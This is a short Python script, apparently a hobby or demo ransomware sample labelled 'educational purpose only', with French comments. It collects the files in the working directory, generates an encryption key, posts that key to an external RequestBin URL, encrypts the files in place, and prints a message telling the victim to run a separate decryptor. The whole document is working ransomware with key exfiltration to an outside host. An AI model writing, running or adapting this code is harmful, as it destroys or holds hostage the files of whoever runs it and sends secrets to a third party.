# EDUCATIONAL PURPOSE ONLY


import os
import requests  # Ajout pour l'envoi de la requête HTTP
from cryptography.fernet import Fernet

# Supprimer l'ancienne clé s'il existe
if os.path.exists("thekey.key"):
    os.remove("thekey.key")

files = []

for file in os.listdir():
    if file in ["install.py", "thekey.key", "demal.py", "InstallRB.py","requirements.txt","README.md"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()



# Votre URL de RequestBin
requestbin_url = "https://requestbin.kanbanbox.com/x30v1yx3"

# Envoyer la clé à votre RequestBin avec la clé 'parazit'
response = requests.post(requestbin_url, data={'parazit': key})

# Vérifier le code de statut de la réponse
if response.status_code == 200:
    print("KEY SENDED RequestBin.")
else:
    print("Échec de l'envoi de la clé à RequestBin. Code de statut :", response.status_code)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("GET CRYPTED")
print("you should run demal.py to decrypt your files")
print("good luck to find the secret phrase!")
